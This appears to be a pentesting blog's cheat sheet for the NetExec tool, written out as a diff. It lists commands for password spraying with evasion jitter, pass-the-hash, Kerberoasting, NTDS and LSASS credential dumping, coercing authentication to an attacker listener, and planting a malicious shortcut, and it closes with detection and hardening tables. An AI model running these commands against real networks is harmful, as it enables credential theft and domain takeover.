@@ -1,0 +1,767 @@
+---
+title: "NetExec (nxc) Operational Cheat Sheet"
+excerpt: "Comprehensive, tradecraft-driven reference for NetExec (nxc). Covers multi-protocol enumeration (SMB, LDAP, WinRM, MSSQL, RDP, WMI, SSH, VNC, FTP), safe password spraying, credential harvesting, BloodHound CE collection, execution methods, and detection telemetry."
+url: "https://asbawy.github.io/cheatsheet/Tools/NetExec"
+date: "2026-09-14"
+updated: "2026-09-14"
+category: "Tools"
+tags: ["netexec", "nxc", "active-directory", "pentesting", "lateral-movement", "tools"]
+difficulty: "Intermediate"
+readTime: "22 mins"
+---
+
+## Understanding NetExec Architecture
+
+**NetExec** (`nxc`) is the modern, actively maintained successor to CrackMapExec (`cme`). Built on a modular Python asynchronous architecture, it automates assessment tasks across nine distinct network protocols. Rather than executing disjointed scripts, NetExec unifies network discovery, authentication testing, credential harvesting, and remote execution into a single, cohesive interface.
+
+```
+                  ┌────────────────────────────────────────────────────────┐
+                  │                 NetExec Engine (nxc)                   │
+                  │   Core CLI  •  Async Engine  •  SQLite DB (~/.nxc)     │
+                  └──────────┬─────────────────────────────────┬───────────┘
+                             │                                 │
+           ┌─────────────────┴─────────────────┐    ┌──────────┴─────────────────┐
+           ▼                                   ▼    ▼                            ▼
+  [ Directory & Identity ]               [ File & Remote Ops ]            [ Data & Telemetry ]
+  • LDAP / LDAPS (389/636)               • SMB / CIFS (445)               • SQLite Results DB
+  • Kerberos / PKINIT                    • WinRM (5985/5986)              • Relay Target Lists
+  • BloodHound CE Ingestion              • WMI / DCOM (135)               • Hashcat / John Dumps
+  • ADCS / Certificate Services          • MSSQL (1433)                   • EDR-Conscious Memory
+                                         • RDP / SSH / VNC / FTP            Dumping Modules
+```
+
+---
+
+## Installation & Setup
+
+Install NetExec via `pipx` to isolate its dependencies and ensure access to modern protocol extensions and community modules.
+
+```bash
+# Install pipx and prerequisites
+sudo apt update && sudo apt install -y pipx git python3-pip
+
+# Ensure local pipx binaries are on PATH
+pipx ensurepath
+
+# Install latest release from GitHub
+pipx install git+https://github.com/Pennyw0rth/NetExec
+
+# Verify version and environment
+nxc --version
+
+# Upgrade NetExec to the latest commit
+pipx upgrade NetExec
+```
+
+> **Tip**: NetExec stores configuration files, protocol databases, and downloaded logs in `~/.nxc/`. Protocol modules reside in `~/.nxc/modules/`.
+
+---
+
+## Global Options & The Built-in Database Engine
+
+### Global Command Structure
+
+```bash
+nxc <protocol> <target(s)> [authentication] [enumeration/action flags] [module options]
+```
+
+| Flag | Argument | Description |
+| :--- | :--- | :--- |
+| `-t` | `<threads>` | Set concurrent thread count (default: 100 for network, 50 for exec). |
+| `--timeout` | `<seconds>` | Set socket timeout threshold in seconds (default: 2.0). |
+| `--jitter` | `<min-max>` | Introduce random delay between requests (e.g. `2-5`) to evade rate-based alerts. |
+| `--delay` | `<seconds>` | Fixed sleep interval between sequential attempts (critical for safe spraying). |
+| `--continue-on-success` | None | Continue spraying the userlist even after a valid match is found. |
+| `--no-bruteforce` | None | Pair users and passwords 1:1 (`user1:pass1`, `user2:pass2`) rather than Cartesian testing. |
+| `--local-auth` | None | Force authentication against the local SAM database rather than the Active Directory domain. |
+| `-k` | None | Authenticate using Kerberos instead of NTLM negotiation. |
+| `--use-kcache` | None | Use Kerberos tickets stored in the environment cache (`KRB5CCNAME`). |
+
+---
+
+### Target Specification Syntax
+
+NetExec handles multiple target representations seamlessly:
+
+```bash
+# Single IPv4 or FQDN target
+nxc smb 10.10.10.100
+nxc smb dc01.corp.local
+
+# Subnet via CIDR notation
+nxc smb 10.10.10.0/24
+
+# Explicit IP range
+nxc smb 10.10.10.50-10.10.10.120
+
+# Multi-target file (newline-delimited IPs, CIDRs, or hostnames)
+nxc smb targets.txt
+```
+
+---
+
+### The Built-in SQLite Database (`nxc db`)
+
+Every successful authentication, discovered host, open share, and extracted credential hash is automatically indexed in NetExec's local SQLite store (`~/.nxc/workspaces/`).
+
+```bash
+# View active workspaces
+nxc db
+
+# Create and switch to a client-specific workspace
+nxc db workspace create ClientAudit2026
+nxc db workspace switch ClientAudit2026
+
+# View all discovered hosts
+nxc db hosts
+
+# Filter hosts where SMB signing is disabled (relay targets)
+nxc db hosts --signing-disabled
+
+# View all stored credentials
+nxc db creds
+
+# Filter credentials with local admin privileges (pwned flag)
+nxc db creds --pwn3d
+
+# Export credentials in user:hash format for offline cracking
+nxc db creds --export hashcat -o hashes.txt
+```
+
+---
+
+## Unified Multi-Protocol Architecture Matrix
+
+NetExec supports nine network protocols out of the box. Use the matrix below to identify capabilities, default network ports, and supported execution mechanics.
+
+| Protocol | Default Port | Primary Assessment Focus | Remote Execution | Key Modules Available |
+| :--- | :--- | :--- | :--- | :--- |
+| **SMB** | `445` / `139` | Host recon, share hunting, SAM/LSA/NTDS dumping, relaying | Yes (`--exec-method`) | `spider_plus`, `lsassy`, `nanodump`, `slinky`, `coerce_plus` |
+| **LDAP(S)** | `389` / `636` | AD directory objects, BloodHound CE ingest, AS-REP/Kerberoast | No | `adcs`, `maq`, `pre2k`, `whisker`, `rbcd`, `ldap-checker` |
+| **WinRM** | `5985` / `5986` | Administrative PowerShell management, lateral movement | Yes (`-x`, `-X`) | Native PowerShell execution |
+| **MSSQL** | `1433` | Database auditing, `xp_cmdshell` execution, hash capturing | Yes (`-x`) | `mssql_priv`, `slinky` |
+| **RDP** | `3389` | NLA verification, user credential testing, desktop snapshots | No | `--screenshot` |
+| **WMI** | `135` / RPC | DCOM-based remote process invocation | Yes (`-x`, `-X`) | Native process execution |
+| **SSH** | `22` | Linux host auditing, key and credential spraying | Yes (`-x`) | Key file authentication (`--key-file`) |
+| **VNC** | `5900` | Remote screen session validation | No | Screen capture / password auth |
+| **FTP** | `21` | Anonymous access, sensitive backup file harvesting | No | `--ls`, `--get` |
+
+---
+
+## Authentication & Identity Mechanics
+
+NetExec supports multiple authentication primitives. Mastering these flags prevents account lockouts and enables Pass-the-Hash, Kerberos ticket injection, and certificate-based PKINIT authentication.
+
+### Null Sessions & Guest Accounts
+
+```bash
+# Test SMB anonymous null session (empty username and empty password)
+nxc smb 10.10.10.100 -u '' -p ''
+
+# Test default guest account access
+nxc smb 10.10.10.100 -u 'guest' -p ''
+
+# Test LDAP unauthenticated bind (anonymous search)
+nxc ldap 10.10.10.100 -u '' -p ''
+```
+
+---
+
+### Local Authentication vs Domain Authentication
+
+By default, NetExec evaluates credentials against the target host's domain. When auditing standalone servers, workstations, or local administrator accounts, use `--local-auth`.
+
+```bash
+# Authenticate against Active Directory domain (CORP.LOCAL)
+nxc smb 10.10.10.100 -d corp.local -u 'jdoe' -p 'Welcome2026!'
+
+# Authenticate against the local workstation SAM database
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' --local-auth
+```
+
+---
+
+### Pass-the-Hash (PtH)
+
+NetExec accepts NTLM hashes in either `LM:NT` format or raw 32-character `NT` hash format using the `-H` flag:
+
+```bash
+# Authenticate over SMB using NTLM hash (32-character NT string)
+nxc smb 10.10.10.100 -u 'Administrator' -H '8846f7eaee8fb117ad06bdd830b7586c' --local-auth
+
+# Authenticate over WinRM with NTLM hash
+nxc winrm 10.10.10.100 -u 'Administrator' -H '8846f7eaee8fb117ad06bdd830b7586c' --local-auth
+
+# Authenticate over WMI with NTLM hash
+nxc wmi 10.10.10.100 -u 'Administrator' -H '8846f7eaee8fb117ad06bdd830b7586c' --local-auth
+```
+
+---
+
+### Kerberos & Ticket Cache (`KRB5CCNAME`)
+
+Using Kerberos avoids generating NTLM challenge-response pairs on the wire, making actions stealthier and bypassing NTLM-disabled environments.
+
+```bash
+# Request TGT and authenticate using Kerberos
+nxc smb dc01.corp.local -u 'jdoe' -p 'Summer2026!' -k
+
+# Authenticate using Kerberos AES-256 key instead of plaintext
+nxc smb dc01.corp.local -u 'jdoe' --aesKey 'a8f47b2c0199e4f...32bytes' -k
+
+# Use an existing Kerberos ccache ticket exported in environment
+export KRB5CCNAME=/tmp/krb5cc_1000
+nxc ldap dc01.corp.local --use-kcache
+nxc smb dc01.corp.local --use-kcache
+```
+
+> **Warning**: When using Kerberos (`-k` or `--use-kcache`), you **must** supply target hostnames (e.g. `dc01.corp.local`), not raw IP addresses, so that NetExec can construct valid Service Principal Names (SPNs).
+
+---
+
+### Certificate & PKINIT Authentication
+
+NetExec supports Public Key Cryptography for Initial Authentication (PKINIT) using exported `.pfx` certificates or paired PEM files:
+
+```bash
+# Authenticate over LDAP using a PFX certificate bundle
+nxc ldap dc01.corp.local -u 'jdoe' --pfx '/path/to/user.pfx' -p 'PfxPasswd'
+
+# Authenticate using separate PEM certificate and private key
+nxc ldap dc01.corp.local -u 'jdoe' --cert-pem '/path/to/cert.pem' --key-pem '/path/to/key.pem'
+```
+
+---
+
+## Phase 1: Discovery, Recon & Misconfiguration Auditing
+
+Begin an engagement with zero-privilege and unauthenticated enumeration to map signing policies, locate relay targets, and inspect password complexity rules.
+
+### SMB Signing & Relay List Generation
+
+SMB Relay attacks require targets where SMB message signing is **not required** (`Signing: False`). NetExec scans entire subnets and formats valid relay targets automatically.
+
+```bash
+# Discover network hosts and inspect SMB signing status
+nxc smb 10.10.10.0/24
+
+# Automatically output unsigned targets into a relay list for Responder/ntlmrelayx
+nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
+```
+
+---
+
+### Domain Password Policy Auditing
+
+Before conducting password spraying, always extract the domain password policy to determine the `BadPasswordCount`, `LockoutDuration`, and `ResetLockoutCounter` thresholds.
+
+```bash
+# Extract domain password policy via anonymous/null session
+nxc smb 10.10.10.10 -u '' -p '' --pass-pol
+
+# Extract password policy using valid domain credentials
+nxc smb 10.10.10.10 -u 'jdoe' -p 'Welcome2026!' --pass-pol
+```
+
+*Example Output Breakdown:*
+- `Account Lockout Threshold`: `5` (Spraying must not exceed 4 failed attempts within the reset window).
+- `Lockout Observation Window`: `30 mins` (Wait 31+ minutes before spraying the next candidate password).
+
+---
+
+### Share & IPC Enumeration
+
+```bash
+# Enumerate SMB shares and access permissions (READ, WRITE) with null session
+nxc smb 10.10.10.0/24 -u '' -p '' --shares
+
+# Enumerate shares with domain credentials across the entire subnet
+nxc smb 10.10.10.0/24 -u 'jdoe' -p 'Welcome2026!' --shares
+
+# Discover active user sessions on hosts
+nxc smb 10.10.10.0/24 -u 'jdoe' -p 'Welcome2026!' --sessions
+
+# Enumerate currently logged-on users across domain endpoints
+nxc smb 10.10.10.0/24 -u 'jdoe' -p 'Welcome2026!' --loggedon-users
+```
+
+---
+
+### RID Cycling / Brute-Forcing
+
+When unauthenticated LDAP is blocked, query the local LSA/SAM interface via SMB SID resolution to discover domain users and groups:
+
+```bash
+# Brute-force RIDs starting from 500 up to 4000 via null session
+nxc smb 10.10.10.10 -u '' -p '' --rid-brute 4000
+
+# RID brute-force with valid low-privilege user
+nxc smb 10.10.10.10 -u 'jdoe' -p 'Welcome2026!' --rid-brute 5000
+```
+
+---
+
+### WebDAV & Coercion Prerequisite Detection
+
+The WebClient (WebDAV) service on Windows workstations provides an HTTP attack vector for NTLM relaying to ADCS or LDAP.
+
+```bash
+# Identify hosts running the WebClient (WebDAV) service
+nxc smb 10.10.10.0/24 -u 'jdoe' -p 'Welcome2026!' -M webdav
+```
+
+---
+
+## Phase 2: Credential Auditing & Password Spraying
+
+Password spraying attempts **one password against many users** to prevent triggering lockout thresholds. Always calculate delays based on the discovered `--pass-pol`.
+
+### Safe Password Spraying Execution
+
+```bash
+# Spray a single password against a list of domain users over SMB
+# --continue-on-success ensures you discover all accounts sharing the password
+nxc smb 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success
+
+# Safe spray with a 10-second delay and 2-5 second jitter between queries
+nxc smb 10.10.10.10 -u users.txt -p 'Autumn2026!' \
+  --continue-on-success \
+  --delay 10 \
+  --jitter 2-5
+```
+
+---
+
+### 1:1 Credential Testing (`--no-bruteforce`)
+
+When testing credential lists obtained from external breach dumps or past compromises, pair each user with their corresponding password without doing a combinatorial cross-product:
+
+```bash
+# Test pairs: (user1:pass1), (user2:pass2) without cross-bruteforcing
+nxc smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+```
+
+---
+
+### Cross-Protocol Validation
+
+Once a credential set is validated, test access across other remote services:
+
+```bash
+# Verify if sprayed credentials work for remote administration via WinRM
+nxc winrm 10.10.10.0/24 -u 'jdoe' -p 'Spring2026!'
+
+# Test credentials on administrative database servers
+nxc mssql 10.10.10.0/24 -u 'jdoe' -p 'Spring2026!'
+
+# Test credentials on internal Linux appliances via SSH
+nxc ssh 10.10.10.0/24 -u 'jdoe' -p 'Spring2026!'
+```
+
+---
+
+## Phase 3: Active Directory & LDAP Deep Dive
+
+LDAP is the primary protocol for auditing Active Directory structures, certificate authorities, Kerberos tickets, and delegation misconfigurations.
+
+### BloodHound CE Data Collection
+
+NetExec includes a native BloodHound ingestor, eliminating the need to drop external binaries or PowerShell scripts on disk.
+
+```bash
+# Comprehensive BloodHound ingestion using TCP DNS
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' \
+  --bloodhound \
+  --collection All \
+  --dns-server 10.10.10.1 \
+  --dns-tcp
+
+# Targeted collection focusing on Domain Controllers only
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' \
+  --bloodhound \
+  --collection DCOnly \
+  --dns-server 10.10.10.1
+```
+
+---
+
+### Kerberoasting & AS-REP Roasting
+
+Harvest Kerberos ticket hashes for offline cracking with Hashcat (`modes 13100 and 18200`):
+
+```bash
+# Query SPNs and extract Kerberoastable TGS ticket hashes
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' --kerberoasting kerberoast_hashes.txt
+
+# Extract AS-REP Roasting hashes for accounts with "Do not require Kerberos preauthentication"
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' --asreproast asrep_hashes.txt
+
+# Unauthenticated AS-REP Roasting test against a list of users
+nxc ldap dc01.corp.local -u users.txt -p '' --asreproast asrep_unauth.txt
+```
+
+---
+
+### ADCS (Active Directory Certificate Services) Audit
+
+Locate Enterprise Certificate Authorities and vulnerable certificate templates (e.g. ESC1, ESC2, ESC3, ESC8):
+
+```bash
+# Enumerate Enterprise CAs and vulnerable certificate templates
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' -M adcs
+
+# Specify target CA server for template attribute extraction
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' -M adcs -o SERVER=ca01.corp.local
+```
+
+---
+
+### Delegation & Machine Account Quota (MAQ)
+
+```bash
+# Discover Unconstrained, Constrained, and Resource-Based Kerberos Delegation
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' --find-delegation
+
+# Inspect MachineAccountQuota (number of computer accounts an unprivileged user can register)
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' -M maq
+
+# Identify Pre-Windows 2000 computer accounts
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' -M pre2k
+```
+
+---
+
+### Group Managed Service Accounts (gMSA)
+
+Accounts configured as gMSA have 128-character managed passwords rotated automatically by Active Directory. If an account has `ReadGMSAPassword` rights, NetExec extracts and decrypts the password blob:
+
+```bash
+# Enumerate all gMSA objects in the domain
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' --gmsa
+
+# Decrypt and compute the NTLM hash of a specific gMSA account
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' --gmsa-decrypt-lsa 'gmsa_svc$'
+```
+
+---
+
+## Phase 4: Multi-Protocol Service Assessment
+
+### WinRM Protocol (TCP 5985/5986)
+
+WinRM provides native remote management for Windows hosts. If an account is part of `Remote Management Users` or `Administrators`, execution runs natively without creating SMB services.
+
+```bash
+# Execute command via cmd.exe over WinRM
+nxc winrm 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' -x 'whoami /all'
+
+# Execute PowerShell expression over WinRM
+nxc winrm 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' -X 'Get-Process | Select-Object -First 5'
+
+# Execute command across an entire IP subnet
+nxc winrm 10.10.10.0/24 -u 'Administrator' -H '8846f7eaee8fb117ad06bdd830b7586c' -x 'hostname'
+```
+
+---
+
+### MSSQL Protocol (TCP 1433)
+
+NetExec interacts directly with Microsoft SQL Server instances using SQL native authentication, Windows domain authentication, or Kerberos.
+
+```bash
+# Authenticate using Windows Domain credentials against MSSQL
+nxc mssql 10.10.10.50 -u 'jdoe' -p 'Welcome2026!' --windows-auth
+
+# Authenticate using native SQL 'sa' account
+nxc mssql 10.10.10.50 -u 'sa' -p 'DbAdmin2026!'
+
+# Execute SQL query
+nxc mssql 10.10.10.50 -u 'sa' -p 'DbAdmin2026!' -q "SELECT @@VERSION; SELECT SYSTEM_USER;"
+
+# Execute operating system commands via xp_cmdshell (NetExec enables it automatically if privileged)
+nxc mssql 10.10.10.50 -u 'sa' -p 'DbAdmin2026!' -x "whoami"
+
+# Audit SQL Server database links and check for privilege escalation paths
+nxc mssql 10.10.10.50 -u 'jdoe' -p 'Welcome2026!' --windows-auth -M mssql_priv
+```
+
+---
+
+### RDP Protocol (TCP 3389)
+
+Audit Network Level Authentication (NLA) status, validate credentials without establishing interactive sessions, and capture desktop screenshots.
+
+```bash
+# Verify RDP availability and test credential validity
+nxc rdp 10.10.10.100 -u 'jdoe' -p 'Welcome2026!'
+
+# Check for Restricted Admin mode (allows Pass-the-Hash over RDP)
+nxc rdp 10.10.10.100 -u 'Administrator' -H '8846f7eaee8fb117ad06bdd830b7586c'
+
+# Take an unauthenticated screenshot of the Windows lock screen to identify logged-on users
+nxc rdp 10.10.10.100 --screenshot --res 1024x768
+```
+
+---
+
+### Native WMI Protocol (TCP 135 / RPC)
+
+Modern NetExec includes a native `wmi` protocol implementation that bypasses SMB port 445 entirely:
+
+```bash
+# Authenticate and execute commands via native WMI
+nxc wmi 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' -x 'whoami'
+
+# WMI execution using NTLM Hash
+nxc wmi 10.10.10.100 -u 'Administrator' -H '8846f7eaee8fb117ad06bdd830b7586c' -x 'ipconfig /all'
+```
+
+---
+
+### SSH, FTP & VNC Operations
+
+```bash
+# SSH: Authenticate with plaintext password and run command
+nxc ssh 10.10.10.75 -u 'root' -p 'toor' -x 'id; uname -a'
+
+# SSH: Authenticate with an exported private SSH key
+nxc ssh 10.10.10.75 -u 'ansible' --key-file /home/user/.ssh/id_rsa -x 'sudo -l'
+
+# FTP: Verify anonymous access and list root files
+nxc ftp 10.10.10.80 -u 'anonymous' -p '' --ls
+
+# FTP: Download sensitive configuration file
+nxc ftp 10.10.10.80 -u 'operator' -p 'FtpPass!' --get-file web.config ./web.config
+
+# VNC: Check unauthenticated access or validate VNC passwords
+nxc vnc 10.10.10.90 -p 'password123'
+```
+
+---
+
+## Phase 5: Share Spidering, File Hunting & Coercion
+
+### Comprehensive Share Spidering (`spider_plus`)
+
+The `spider_plus` module catalogs all accessible shares across an organization, producing a JSON tree of files while filtering out noise.
+
+```bash
+# Spider shares and output file metadata to ~/.nxc/logs/
+nxc smb 10.10.10.0/24 -u 'jdoe' -p 'Welcome2026!' -M spider_plus
+
+# Spider shares, excluding common administrative shares and setting maximum file size
+nxc smb 10.10.10.100 -u 'jdoe' -p 'Welcome2026!' -M spider_plus \
+  -o EXCLUDE_DIR='IPC$,PRINT$,ADMIN$' \
+  MAX_FILE_SIZE=500000 \
+  OUTPUT_PATH=/tmp/spider_results.json
+
+# Search shares specifically for sensitive extensions (passwords, keys, databases)
+nxc smb 10.10.10.100 -u 'jdoe' -p 'Welcome2026!' -M spider_plus \
+  -o EXT_LIST='kdbx,docx,xlsx,config,vmdk,ovpn,id_rsa,pfx'
+```
+
+---
+
+### File Upload & Download Operations
+
+```bash
+# Download a remote file from an SMB share
+nxc smb 10.10.10.100 -u 'jdoe' -p 'Welcome2026!' \
+  --share 'Finance' \
+  --get-file 'QuarterlyReview.xlsx' ./QuarterlyReview.xlsx
+
+# Upload a local file to a writable share
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' \
+  --share 'C$' \
+  --put-file ./payload.exe 'Windows\Temp\payload.exe'
+```
+
+---
+
+### Authentication Coercion Suite
+
+Coerce machine accounts into authenticating to an attacker-controlled listener (e.g. Responder, `ntlmrelayx`) using MS-RPRN or MS-EFSR protocols:
+
+```bash
+# Multi-protocol coercion module (PetitPotam, DFSCoerce, ShadowCoerce)
+nxc smb 10.10.10.10 -u 'jdoe' -p 'Welcome2026!' -M coerce_plus -o LISTENER=10.10.14.5
+
+# Coerce via PetitPotam (MS-EFSR)
+nxc smb 10.10.10.10 -u 'jdoe' -p 'Welcome2026!' -M petitpotam -o LISTENER=10.10.14.5
+
+# Coerce via PrintBug (MS-RPRN Printer Spooler)
+nxc smb 10.10.10.10 -u 'jdoe' -p 'Welcome2026!' -M printerbug -o LISTENER=10.10.14.5
+```
+
+---
+
+### Malicious Shortcut Injection (`slinky`)
+
+Place `.lnk` files in writable network shares to coerce NTLM hashes when domain users navigate to the folder in Windows Explorer:
+
+```bash
+# Plant malicious shortcut referencing an attacker SMB listener
+nxc smb 10.10.10.100 -u 'jdoe' -p 'Welcome2026!' \
+  --share 'Public' \
+  -M slinky -o SERVER=10.10.14.5 NAME='Payroll_2026.lnk'
+
+# Clean up shortcut files after testing
+nxc smb 10.10.10.100 -u 'jdoe' -p 'Welcome2026!' \
+  --share 'Public' \
+  -M slinky -o CLEANUP=True NAME='Payroll_2026.lnk'
+```
+
+---
+
+## Phase 6: Credential Extraction & Secrets Harvesting
+
+Once administrative access (`(Pwn3d!)`) is confirmed, extract credentials from local storage, Active Directory databases, or process memory.
+
+### Local Credential Extraction (SAM, LSA, DPAPI)
+
+```bash
+# Dump the local SAM database (extracts RID 500 and local user NTLM hashes)
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' --local-auth --sam
+
+# Dump LSA Secrets (service credentials, autologon passwords, scheduled task accounts)
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' --local-auth --lsa
+
+# Dump DPAPI system backup keys and credential vault blobs
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' --local-auth --dpapi
+
+# Extract all local stores simultaneously
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' --local-auth --sam --lsa --dpapi
+```
+
+---
+
+### Domain NTDS.dit Extraction
+
+Extracting `NTDS.dit` provides password hashes for every account in the Active Directory domain.
+
+```bash
+# Dump domain password hashes via DRSUAPI (vss/drsuapi replication protocol)
+nxc smb dc01.corp.local -u 'Administrator' -p 'P@ssw0rd123' --ntds
+
+# Target a single high-value user to minimize network noise
+nxc smb dc01.corp.local -u 'Administrator' -p 'P@ssw0rd123' --ntds --user krbtgt
+
+# Extract NTDS.dit using ntdsutil Volume Shadow Copy (alternative if DRSUAPI is monitored)
+nxc smb dc01.corp.local -u 'Administrator' -p 'P@ssw0rd123' -M ntdsutil
+```
+
+---
+
+### LAPS Password Extraction (Legacy & Windows LAPS)
+
+Local Administrator Password Solution (LAPS) stores randomized local admin passwords in Active Directory attributes. NetExec queries both legacy and modern Windows LAPS schemas:
+
+```bash
+# Enumerate LAPS passwords via SMB
+nxc smb dc01.corp.local -u 'jdoe' -p 'Welcome2026!' --laps
+
+# Enumerate LAPS passwords via LDAP
+nxc ldap dc01.corp.local -u 'jdoe' -p 'Welcome2026!' --laps
+```
+
+> **Note**: Legacy LAPS utilizes the attribute `ms-Mcs-AdmPwd` (plaintext), whereas modern **Windows LAPS** (Windows 11 / Server 2022+) stores passwords in `msLAPS-Password` (optionally encrypted). NetExec handles schema negotiation automatically.
+
+---
+
+### LSASS Process Memory Dumping
+
+Dumping `lsass.exe` directly often alerts modern EDR solutions. NetExec integrates multiple specialized modules designed to minimize detection:
+
+```bash
+# Extract credentials using lsassy (modular remote LSASS dump & parsing)
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' -M lsassy
+
+# Use NanoDump to create a mini-dump with handle duplication and spoofed signatures
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' -M nanodump
+
+# Use HandleKatz to dump LSASS using existing process handles
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' -M handlekatz
+```
+
+---
+
+### Group Policy Preference (GPP) Passwords
+
+Legacy Domain Controllers often retain encrypted passwords in `SYSVOL` policy XML files (`Groups.xml`, `Services.xml`). NetExec recovers and decrypts them using the static Microsoft AES private key:
+
+```bash
+# Search SYSVOL for GPP passwords and decrypt cpassword attributes
+nxc smb dc01.corp.local -u 'jdoe' -p 'Welcome2026!' -M gpp_password
+
+# Search for GPP AutoLogon credentials stored in registry XML files
+nxc smb dc01.corp.local -u 'jdoe' -p 'Welcome2026!' -M gpp_autologin
+```
+
+---
+
+## Phase 7: Execution Methods & Tradecraft Matrix
+
+When executing commands over SMB, NetExec provides multiple backend mechanisms configured via `--exec-method`. Choosing the appropriate method depends on the target's operating system version and endpoint security posture.
+
+```bash
+# Default execution: wmiexec
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' -x 'whoami'
+
+# Force execution via smbexec
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' --exec-method smbexec -x 'net user'
+
+# Force execution via atexec (Task Scheduler)
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' --exec-method atexec -x 'ipconfig'
+
+# Force execution via mmcexec (COM object)
+nxc smb 10.10.10.100 -u 'Administrator' -p 'P@ssw0rd123' --exec-method mmcexec -x 'whoami'
+```
+
+---
+
+### Under-The-Hood Execution Comparison
+
+| Method | Protocol / API | Service Created? | Output Delivery Mechanism | Forensic Indicator |
+| :--- | :--- | :--- | :--- | :--- |
+| **`wmiexec`** | DCOM (`135`) / WMI (`Win32_Process`) | **No** | Output written to temp file via `cmd.exe /c` redirected to `ADMIN$` or `C$` | Process creation with parent `WmiPrvSE.exe` |
+| **`smbexec`** | RPC / Service Control Manager (`SVCCTL`) | **Yes** | Temporary Windows service executes `.bat` script, pipes to `__output` share file, deletes service | Windows Event ID `7045` / `4697` generated |
+| **`atexec`** | RPC / Task Scheduler (`ATSVC` / `ITaskScheduler`) | **No** | Creates scheduled task set to run immediately, extracts output from temp file, deletes task | Windows Event ID `4698` (Scheduled Task created) |
+| **`mmcexec`** | DCOM (`MMC20.Application`) | **No** | Invokes `Document.ActiveView.ExecuteShellCommand` via COM | Spawned process child of `mmc.exe` |
+
+> **Key Rule**: Avoid `smbexec` against environments monitored by SIEM or EDR, because creating and instantly deleting a service triggers high-confidence detection rules (`7045`). Prefer **`wmiexec`** or native **`winrm`**.
+
+---
+
+## Phase 8: Detection Telemetry & Blue Team Hardening
+
+Understanding the defensive footprint left by NetExec allows penetration testers to operate conscientiously and assists blue teams in tuning detection filters.
+
+### Windows Event ID Mapping
+
+| Event ID | Event Source | NetExec Activity Trigger | Forensic Indicator / Query Filter |
+| :--- | :--- | :--- | :--- |
+| **`4624`** | Security | Successful Logon | `LogonType = 3` (Network logon via SMB/RPC/WinRM) or `LogonType = 10` (RDP). |
+| **`4625`** | Security | Failed Logon Attempt | High volume of `Status = 0xC000006A` (wrong password) across multiple accounts from single workstation IP. |
+| **`4672`** | Security | Special Privileges Assigned | `SeDebugPrivilege` or `SeBackupPrivilege` assigned upon successful `(Pwn3d!)` administrative logon. |
+| **`7045`** | System | Service Creation | Temporary randomized service created by `--exec-method smbexec`. |
+| **`5140`** / **`5145`** | Security | Share / Object Access | Access checks against administrative shares: `IPC$`, `ADMIN$`, `C$`. |
+| **`4768`** | Security | Kerberos TGT Request | AS-REP Roasting activity: `PreAuthType = 0` (`DONT_REQ_PREAUTH`). |
+| **`4769`** | Security | Kerberos Service Ticket (TGS) | Kerberoasting activity: `TicketOptions = 0x40810000` with `TicketEncryptionType = 0x17` (RC4). |
+| **`4662`** | Security | Operation on AD Object | NTDS DCSync replication: Extended right `DS-Replication-Get-Changes-All` (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`). |
+| **Sysmon `1`** | Microsoft-Windows-Sysmon | Process Creation | Command line execution patterns: `cmd.exe /Q /c ... \127.0.0.1\C$\__output`. |
+| **Sysmon `10`** | Microsoft-Windows-Sysmon | Process Access | `SourceImage` accessing `TargetImage = lsass.exe` with `GrantedAccess = 0x1010` (`PROCESS_VM_READ`). |
+
+---
+
+### Blue Team Hardening Checklist
+
+1. **Enforce SMB Signing**:
+   - Set `Microsoft network server: Digitally sign communications (always)` to **Enabled** via Group Policy. This invalidates SMB relaying completely.
+2. **Enforce LDAP Signing & Channel Binding**:
+   - Enable LDAP server signing requirements and LdapEnforceChannelBinding (`2` - Always) to prevent LDAP relaying from PetitPotam / WebDAV.
+3. **Deploy Windows LAPS**:
+   - Transition from legacy LAPS to native Windows LAPS, enabling automatic encryption of passwords stored in `msLAPS-Password`.
+4. **Disable NTLMv1**:
+   - Enforce NTLMv2 minimums (`LMCompatibilityLevel = 5`) and restrict NTLM usage across the domain using Protected Users security groups.
+5. **Protect High-Privilege Accounts**:
+   - Add Domain Admins and sensitive service accounts to the **Protected Users** group to prevent caching plaintext credentials, NTLM hashes, or RC4 tickets in LSASS memory.
